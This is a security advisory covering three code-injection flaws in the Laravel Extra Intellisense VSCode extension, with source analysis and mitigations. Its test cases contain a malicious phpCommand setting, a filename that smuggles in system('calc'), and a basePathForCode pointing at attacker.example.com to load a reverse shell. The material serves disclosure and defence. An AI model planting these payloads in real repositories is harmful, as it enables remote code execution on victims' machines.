### Vulnerability List

* Vulnerability Name: Command Injection via `phpCommand` configuration

    * Description:
        The `Laravel Extra Intellisense` extension allows users to configure the PHP command used to run Laravel code through the `LaravelExtraIntellisense.phpCommand` setting in VSCode workspace settings. This setting is directly passed to `child_process.exec` in the `runPhp` function without sufficient sanitization. A malicious user who can influence the VSCode workspace settings (e.g., by providing a malicious repository) can inject arbitrary shell commands into the `phpCommand`. When the extension executes PHP code using `Helpers.runLaravel` or `Helpers.runPhp`, the injected commands will be executed by the system.

        **Step-by-step trigger:**
        1. A threat actor creates a malicious Laravel repository.
        2. The malicious repository includes a `.vscode/settings.json` file.
        3. In the `.vscode/settings.json`, the threat actor sets the `LaravelExtraIntellisense.phpCommand` to a malicious command, for example: `"LaravelExtraIntellisense.phpCommand": "bash -c '{code} && touch /tmp/pwned'"`.
        4. A victim clones or opens the malicious repository in VSCode with the `Laravel Extra Intellisense` extension installed.
        5. The extension attempts to run Laravel code (e.g., to fetch routes, views, or configs), which triggers the `runPhp` function using the malicious `phpCommand` from the workspace settings.
        6. The injected command (`touch /tmp/pwned` in the example) is executed on the victim's system.

    * Impact:
        Remote Code Execution (RCE). An attacker can execute arbitrary shell commands on the victim's machine with the privileges of the VSCode process. This can lead to complete compromise of the victim's system, including data theft, malware installation, and further lateral movement within the victim's network.

    * Vulnerability Rank: Critical

    * Currently Implemented Mitigations:
        None. The code directly uses the user-provided `phpCommand` setting without any sanitization or validation.

    * Missing Mitigations:
        - Input Sanitization/Validation: Sanitize or validate the `phpCommand` setting to prevent command injection. Ideally, restrict the command to a fixed path to the PHP executable and only allow passing the generated PHP code as an argument, without shell interpretation of the command template.
        - Principle of Least Privilege: While not directly a mitigation for this vulnerability, running the PHP commands with the least necessary privileges would limit the impact of a successful command injection. However, this is likely not feasible in the context of a VSCode extension.
        - User Awareness: Improve the security note in the README to explicitly warn users about the risks of using custom `phpCommand` settings from untrusted repositories. However, this is not a sufficient mitigation.

    * Preconditions:
        1. The victim must have the `Laravel Extra Intellisense` extension installed in VSCode.
        2. The victim must open a malicious Laravel repository in VSCode that contains a crafted `.vscode/settings.json` file with a malicious `LaravelExtraIntellisense.phpCommand`.
        3. The extension must be triggered to execute a PHP command (this happens automatically when the extension is active in a Laravel project).

    * Source Code Analysis:

        1. **File:** `src/helpers.ts`
        2. **Function:** `runPhp(code: string, description: string|null = null)`
        3. **Code Snippet:**
            ```typescript
            static async runPhp(code: string, description: string|null = null) : Promise<string> {
                code = code.replace(/\"/g, "\\\"");
                if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                    code = code.replace(/\$/g, "\\$");
                    code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                    code = code.replace(/\\\\"/g, '\\\\\\\\\"');
                }
                let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
                let command = commandTemplate.replace("{code}", code);
                let out = new Promise<string>(function (resolve, error) {
                    if (description != null) {
                        Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
                    }

                    cp.exec(command, // Vulnerable function: cp.exec is used to execute the command string
                        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                        function (err, stdout, stderr) {
                            if (err == null) {
                                if (description != null) {
                                    Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                                }
                                resolve(stdout);
                            } else {
                                const errorOutput = stderr.length > 0 ? stderr : stdout;
                                Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                                Helpers.showErrorPopup();
                                error(errorOutput);
                            }
                        }
                    );
                });
                return out;
            }
            ```
        4. **Analysis:**
            The `runPhp` function retrieves the `phpCommand` from the workspace configuration and uses `String.replace()` to insert the generated PHP code into the command template.  Crucially, `cp.exec(command, ...)` then directly executes this constructed command string. There is no sanitization of the `commandTemplate` itself before being passed to `cp.exec`.

    * Security Test Case:

        1. **Setup:**
            - Victim machine with VSCode and `Laravel Extra Intellisense` extension installed.
            - Attacker machine to create a malicious repository.
        2. **Attacker Actions:**
            - Create a new Laravel project.
            - Navigate to the project directory.
            - Create a `.vscode` directory and a `settings.json` file inside with the following content:
                ```json
                {
                    "LaravelExtraIntellisense.phpCommand": "bash -c '{code} && touch /tmp/pwned-laravel-extension'"
                }
                ```
            - Host the repository on a public platform like GitHub.
        3. **Victim Actions:**
            - Clone the malicious repository.
            - Open the `victim-repo` folder in VSCode.
            - Wait for the `Laravel Extra Intellisense` extension to initialize.
        4. **Verification:**
            - On the victim's machine, check if the file `/tmp/pwned-laravel-extension` exists. If the file exists, the command injection vulnerability is confirmed.

* Vulnerability Name: Command Injection in Translation Provider

    * Description:
        The Laravel Extra Intellisense extension is vulnerable to command injection. This vulnerability can be triggered by a malicious actor who provides a crafted Laravel project repository to a victim. By creating a translation file with a specially crafted filename within the `lang` directory of the malicious repository, an attacker can inject arbitrary PHP code that gets executed on the victim's machine when the extension attempts to load translations. The vulnerability occurs because the extension uses filenames from the filesystem directly within generated PHP code without proper sanitization.

        **Step-by-step trigger:**
        1. Attacker creates a malicious Laravel project repository.
        2. Inside the `lang/en/` directory, create a new PHP file named `test'); system('calc'); //.php`.
        3. Victim opens the malicious Laravel project repository in VSCode with the "Laravel Extra Intellisense" extension installed.
        4. Wait for the extension to activate and load translations.
        5. Observe if the calculator application is launched on the victim's machine, indicating command execution.

    * Impact:
        Remote Code Execution (RCE). An attacker can execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This could lead to complete system compromise, data theft, or further malicious activities.

    * Vulnerability Rank: High

    * Currently Implemented Mitigations:
        None. The extension does not sanitize filenames used in generated PHP code.

    * Missing Mitigations:
        - Sanitize filenames obtained from the filesystem before incorporating them into PHP code strings. Specifically, when constructing the PHP code in `TranslationProvider.ts`, filenames should be escaped or validated to prevent code injection.
        - Consider using more secure methods to obtain translation data, avoiding dynamic code execution based on filesystem content.

    * Preconditions:
        - The victim must have the "Laravel Extra Intellisense" extension installed in VSCode.
        - The victim must open a workspace in VSCode that contains a malicious Laravel project repository provided by the attacker.
        - The malicious repository must contain a crafted translation file with a malicious filename in the `lang` directory.

    * Source Code Analysis:

        1. **File:** `src/TranslationProvider.ts`
        2. **Function:** `loadTranslations()`
        3. **Code Snippet:**
            ```typescript
            if (fs.lstatSync(path + '/' + file).isFile()) {
                out.push(relativePath + '/' + file.replace(/\.php/, ''));
            }
            ```
            and
            ```typescript
            fs.readdirSync(langPath).forEach(function (langDir) { ...
                fs.readdirSync(path).forEach(function (file) {
                    if (fs.lstatSync(path + '/' + file).isFile()) {
                        translationGroups.push(i + file.replace(/\.php/, ''));
                    }
                });
            });
            ```
        4. **Analysis:**
            Filenames are processed without sanitization. The `file.replace(/\.php/, '')` removes the extension, but the filename itself is used directly to construct PHP code.
        5. **Code Snippet (PHP Code Generation):**
            ```typescript
            Helpers.runLaravel("echo json_encode([" + translationGroups.map((transGroup: string) => "'" + transGroup + "' => __('" + transGroup + "')").join(",") + "]);", "Translations inside namespaces")
            ```
        6. **Analysis:**
            The `transGroup` variable, derived from the filename, is directly embedded within the `'__('${transGroup}')'` part of the PHP code string, leading to command injection if the filename is malicious.

    * Security Test Case:

        1. **Setup Malicious Repository:**
            - Create a malicious Laravel project directory.
            - Navigate to the `lang/en/` directory.
            - Create a new PHP file named `test'); system('calc'); //.php`.
        2. **Victim Setup:**
            - Ensure the "Laravel Extra Intellisense" extension is installed and enabled in VSCode.
            - Open VSCode and open the malicious Laravel project directory as a workspace.
        3. **Trigger Vulnerability:**
            - Wait for the extension to activate and load translations.
        4. **Verify Command Execution:**
            - Observe if the calculator application is launched on the victim's machine.

* Vulnerability Name: Potential Code Injection via `basePathForCode` configuration

    * Description:
        The extension relies on user-defined workspace configuration files, specifically `.vscode/settings.json`, to customize its behavior. The `LaravelExtraIntellisense.basePathForCode` setting controls the base paths used by the extension. These paths are used in `require_once` and `chdir` operations within the PHP code executed by the extension. By manipulating these settings, an attacker can potentially inject and execute arbitrary PHP code when the extension runs Laravel commands.

        **Step-by-step trigger:**
        1. An attacker crafts a malicious Laravel project with a `.vscode/settings.json` file.
        2. In the `.vscode/settings.json`, the attacker sets the `LaravelExtraIntellisense.basePathForCode` setting to a path that includes a malicious PHP file under their control. For example, the attacker could set it to a public web server URL that serves a PHP file with malicious code.
        3. When the extension executes PHP code using `Helpers.runLaravel`, the malicious `basePathForCode` is used in `require_once`.
        4. If the attacker carefully crafts the injected path, they can trick `require_once` to include a malicious PHP file from the attacker-controlled location, which will then be executed in the context of the Laravel application execution within the extension.

    * Impact:
        Code Injection, potentially leading to Remote Code Execution (RCE). An attacker can inject and execute arbitrary PHP code within the context of the Laravel application, potentially leading to data theft, malware installation, or further attacks.

    * Vulnerability Rank: High

    * Currently Implemented Mitigations:
        None. The extension directly uses the configured `basePathForCode` without any sanitization or validation when constructing paths for `require_once`.

    * Missing Mitigations:
        - Input sanitization and validation for `LaravelExtraIntellisense.basePath` and `LaravelExtraIntellisense.basePathForCode` settings. The extension should validate these paths to ensure they are within the workspace directory and do not point to external or attacker-controlled locations.
        - Implement path canonicalization to resolve symbolic links and prevent path traversal attacks.
        - Avoid using `require_once` with user-controlled paths. If `require_once` is necessary, ensure the path is strictly validated and canonicalized.

    * Preconditions:
        - Victim has the Laravel Extra Intellisense extension installed in VSCode.
        - Victim opens a workspace in VSCode that contains a malicious `.vscode/settings.json` file.
        - The malicious `.vscode/settings.json` file configures `LaravelExtraIntellisense.basePathForCode` to a path pointing to a malicious PHP file.

    * Source Code Analysis:

        1. **File:** `src/helpers.ts`
        2. **Function:** `projectPath(path:string, forCode: boolean = false)`
        3. **Code Snippet:**
            ```typescript
            static projectPath(path:string, forCode: boolean = false) : string {
                let basePathForCode = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePathForCode');
                if (forCode && basePathForCode && basePathForCode.length > 0) {
                    if (basePathForCode.startsWith('.') && vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0) {
                        basePathForCode = resolve(vscode.workspace.workspaceFolders[0].uri.fsPath, basePathForCode);
                    }
                    basePathForCode = basePathForCode.replace(/[\/\\]$/, "");
                    return basePathForCode + path; // vulnerable path construction
                }
                // ...
            }
            ```
        4. **Analysis:**
            The `projectPath` function retrieves `basePathForCode` from settings and constructs file paths using it for code execution context, without proper validation.
        5. **File:** `src/helpers.ts`
        6. **Function:** `runLaravel(code: string, description: string|null = null)`
        7. **Code Snippet:**
            ```typescript
            Helpers.runLaravel(code: string, description: string|null = null) : Promise<string> {
                // ...
                require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" // require_once using projectPath with forCode=true
                // ...
                $app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" // require_once using projectPath with forCode=true
                // ...
            }
            ```
        8. **Analysis:**
            `Helpers.runLaravel` uses `Helpers.projectPath(..., true)` when constructing paths for `require_once`, making it vulnerable if `basePathForCode` is maliciously configured.

    * Security Test Case:

        1. **Attacker setup:**
            - Create a malicious Laravel project directory.
            - Inside the project directory, create `.vscode` folder.
            - Inside `.vscode` folder, create `settings.json` file with the following content (assuming attacker controls `http://attacker.example.com/malicious.php`):
                ```json
                {
                    "LaravelExtraIntellisense.basePathForCode": "http://attacker.example.com"
                }
                ```
            - Create `malicious.php` on `http://attacker.example.com` with php reverse shell code.

        2. **Victim actions:**
            - Install Laravel Extra Intellisense extension in VSCode.
            - Open the malicious project directory in VSCode.
            - Open any PHP or Blade file within the project.

        3. **Verification:**
            - On the attacker machine, the `netcat` listener should receive a connection, confirming code injection and RCE.
